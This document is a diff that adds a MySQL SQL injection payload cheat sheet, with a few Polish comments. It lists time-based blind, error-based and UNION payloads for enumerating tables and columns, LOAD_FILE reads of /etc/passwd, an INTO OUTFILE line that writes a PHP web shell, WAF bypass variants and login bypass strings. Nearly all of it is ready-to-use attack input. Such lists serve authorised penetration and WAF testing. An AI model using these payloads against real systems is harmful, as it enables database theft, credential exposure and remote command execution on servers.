@@ -1,0 +1,38 @@
+# === Time-based blind ===
+' AND SLEEP(5)-- -
+' AND IF(1=1,SLEEP(5),0)-- -
+' OR SLEEP(5)-- -
+' AND BENCHMARK(5000000,MD5('a'))-- -
+
+# === Error-based extraction ===
+' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+# === UNION — info_schema enum ===
+' UNION SELECT @@version,user(),database()-- -
+' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),2,3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -
+
+# === File read (LOAD_FILE — wymaga FILE priv) ===
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
+' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3-- -
+
+# === File write (INTO OUTFILE) ===
+' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/x.php'-- -
+
+# === Comment variants ===
+'#
+'-- -
+'/*
+'%23
+
+# === MySQL-specific WAF bypass ===
+# Inline comment wewnątrz keywordów
+'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
+# Backtick zamiast spacji
+'UNION(SELECT(1),(2),(3))-- -
+
+# === Login bypass — MySQL ===
+' OR 1=1 LIMIT 1-- -
+admin' AND 1=0 UNION SELECT 1,'admin',MD5('password')-- -
